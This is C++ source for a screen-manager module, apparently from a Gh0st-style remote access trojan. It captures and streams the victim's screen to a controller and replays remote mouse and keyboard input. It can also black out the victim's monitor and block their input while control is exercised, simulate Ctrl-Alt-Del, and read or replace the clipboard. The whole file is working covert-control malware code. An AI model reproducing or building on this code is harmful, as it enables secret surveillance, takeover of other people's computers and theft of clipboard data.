#include "ScreenManager.h"
#include "until.h"
#include <winable.h>
#include <iostream>

CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
{	
	m_bIsWorking = true;
	m_bIsBlankScreen = false;
	m_bIsBlockInput = false;
	m_bIsCaptureLayer = false;

	m_bAlgorithm = ALGORITHM_SCAN;
	m_biBitCount = 8;
	
	m_pScreenSpy = new CScreenSpy(8);

	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
	m_hBlankThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, this, 0, NULL, true);
}

CScreenManager::~CScreenManager()
{
	InterlockedExchange((LPLONG)&m_bIsBlankScreen, false);
	InterlockedExchange((LPLONG)&m_bIsWorking, false);

	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hBlankThread, INFINITE);
	
	CloseHandle(m_hWorkThread);
	CloseHandle(m_hBlankThread);

	if (m_pScreenSpy)
	{
		delete m_pScreenSpy;
	}
}

void CScreenManager::ResetScreen(int biBitCount)
{
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);

	delete m_pScreenSpy;

	if (3 == biBitCount)		// 4位灰度
	{
		m_pScreenSpy = new CScreenSpy(4, true);
	}
	else if (7 == biBitCount)	// 8位灰度
	{
		m_pScreenSpy = new CScreenSpy(8, true);
	}
	else
	{
		m_pScreenSpy = new CScreenSpy(biBitCount);
	}

	m_pScreenSpy->setAlgorithm(m_bAlgorithm);
	m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);

	m_biBitCount = biBitCount;

	m_bIsWorking = true;
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	try
	{
 		switch (lpBuffer[0])
 		{
		case COMMAND_NEXT:
			NotifyDialogIsOpen();
			break;
		case COMMAND_SCREEN_RESET:
			ResetScreen(*(LPBYTE)&lpBuffer[1]);
			break;
		case COMMAND_ALGORITHM_RESET:
			m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setAlgorithm(m_bAlgorithm);
			break;
		case COMMAND_SCREEN_CTRL_ALT_DEL:
			::SimulateCtrlAltDel();
			break;
		case COMMAND_SCREEN_CONTROL:
			{
				BlockInput(false);
				ProcessMouseAndKeyCommand(lpBuffer + 1, nSize - 1);
				BlockInput(m_bIsBlockInput);
			}
			break;
		case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
			m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_BLANK:
			m_bIsBlankScreen = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_CAPTURE_LAYER:
			m_bIsCaptureLayer = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
			break;
		case COMMAND_SCREEN_GET_CLIPBOARD:
			SendLocalClipboard();
			break;
		case COMMAND_SCREEN_SET_CLIPBOARD:
			UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
			break;
		default:
			break;
		}
	}catch(...){}
}

void CScreenManager::sendBITMAPINFO()
{
	DWORD dwBytesLength = 1 + m_pScreenSpy->getBISize();
	LPBYTE	lpBuffer = new(std::nothrow) BYTE[dwBytesLength];
	if (lpBuffer == NULL)
	{
		return;
	}
	
	lpBuffer[0] = TOKEN_BITMAPINFO;
	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
	
	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}

void CScreenManager::sendFirstScreen()
{
	LPVOID lpFirstScreen = NULL;
	lpFirstScreen = m_pScreenSpy->getFirstScreen();
	if (lpFirstScreen == NULL)
	{
		return;
	}

	DWORD dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
	LPBYTE lpBuffer = new(std::nothrow) BYTE[dwBytesLength];
	if (lpBuffer == NULL)
	{
		return;
	}

	lpBuffer[0] = TOKEN_FIRSTSCREEN;
	memcpy(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);

	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}

void CScreenManager::sendNextScreen()
{
	DWORD dwBytes = 0;
	LPVOID	lpNetScreen = NULL;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);
	if (0 == dwBytes || !lpNetScreen)
	{
		return;
	}

	DWORD dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new(std::nothrow) BYTE[dwBytesLength];
	if (!lpBuffer)
	{
		return;
	}
	
	lpBuffer[0] = TOKEN_NEXTSCREEN;
	memcpy(lpBuffer + 1, lpNetScreen, dwBytes);

	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}

DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
{
	CScreenManager *pThis = (CScreenManager *)lparam;

	pThis->sendBITMAPINFO();
	pThis->WaitForDialogOpen();
	pThis->sendFirstScreen();

	while (pThis->m_bIsWorking)
	{
		pThis->sendNextScreen();
	}

	return 0;
}

// 创建这个线程主要是为了保持一直黑屏
DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
{
	CScreenManager *pThis = (CScreenManager *)lparam;

	static	bool bIsScreenBlanked = false;

	while (pThis->IsConnect())
	{
		// todo:加快反应速度
		for (int i = 0; i < 100; i++)
		{
			if (pThis->IsConnect())
			{
				if (pThis->IsMetricsChange())
				{
					pThis->ResetScreen(pThis->GetCurrentPixelBits());
				}
				Sleep(10);
			}
			else
			{
				break;
			}
		}

		if (pThis->m_bIsBlankScreen)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
		}
		else
		{
			if (bIsScreenBlanked)
			{
				SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
				SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
				bIsScreenBlanked = false;
			}
		}

		BlockInput(pThis->m_bIsBlockInput);

		if (pThis->IsMetricsChange())
		{
			pThis->ResetScreen(pThis->GetCurrentPixelBits());
		}
	}

	BlockInput(false);
	return -1;
}

void CScreenManager::ProcessMouseAndKeyCommand(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize % sizeof(MSG) != 0)
		return;

	SwitchInputDesktop();

	int	nCount = nSize / sizeof(MSG);
	for (int i = 0; i < nCount; i++)
	{
		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
		switch (pMsg->message)
		{
			case WM_LBUTTONDOWN:
			case WM_LBUTTONUP:
			case WM_RBUTTONDOWN:
			case WM_RBUTTONUP:
			case WM_MOUSEMOVE:
			case WM_LBUTTONDBLCLK:
			case WM_RBUTTONDBLCLK:
			case WM_MBUTTONDOWN:
			case WM_MBUTTONUP:
				{
					POINT point;
					point.x = LOWORD(pMsg->lParam);
					point.y = HIWORD(pMsg->lParam);
					SetCursorPos(point.x, point.y);
					SetCapture(WindowFromPoint(point));
				}
				break;
			default:
				break;
		}

		switch(pMsg->message)
		{
			case WM_LBUTTONDOWN:
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				break;
			case WM_LBUTTONUP:
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				break;
			case WM_RBUTTONDOWN:
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
				break;
			case WM_RBUTTONUP:
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				break;
 			case WM_LBUTTONDBLCLK:
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
 				break;
 			case WM_RBUTTONDBLCLK:
 				mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
 				break;
			case WM_MBUTTONDOWN:
				mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
 				break;
			case WM_MBUTTONUP:
				mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
				break;
			case WM_MOUSEWHEEL:
				mouse_event(MOUSEEVENTF_WHEEL, 0, 0, GET_WHEEL_DELTA_WPARAM(pMsg->wParam), 0);
				break;
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
				keybd_event((UINT)pMsg->wParam, MapVirtualKey((UINT)pMsg->wParam, 0), 0, 0);
				break;	
			case WM_KEYUP:
			case WM_SYSKEYUP:
				keybd_event((UINT)pMsg->wParam, MapVirtualKey((UINT)pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
				break;
			default:
				break;
		}
	}	
}

void CScreenManager::UpdateLocalClipboard(char *buf, int nLen)
{
	if (!::OpenClipboard(NULL))
		return;
	
	::EmptyClipboard();
	
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, nLen);
	if (hglbCopy)
	{ 
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, nLen); 
		GlobalUnlock(hglbCopy);

		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}

	CloseClipboard();
}

void CScreenManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
	{
		return;
	}

	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (!hglb)
	{
		::CloseClipboard();
		return;
	}

	int	nPacketLen = (int)GlobalSize(hglb) + 1;

	LPBYTE	lpData = new(std::nothrow) BYTE[nPacketLen];
	if (!lpData)
	{
		return;
	}
	
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	lpData[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);

	::GlobalUnlock(hglb);
	::CloseClipboard();
	
	Send(lpData, nPacketLen);
	delete[] lpData;
}

bool CScreenManager::IsMetricsChange()
{
	LPBITMAPINFO	lpbmi =	m_pScreenSpy->getBI();

	return (lpbmi->bmiHeader.biWidth != ::GetSystemMetrics(SM_CXSCREEN)) || (lpbmi->bmiHeader.biHeight != ::GetSystemMetrics(SM_CYSCREEN));
}

bool CScreenManager::IsConnect()
{
	return m_pClient->IsRunning();
}

int CScreenManager::GetCurrentPixelBits()
{
	return m_biBitCount;
}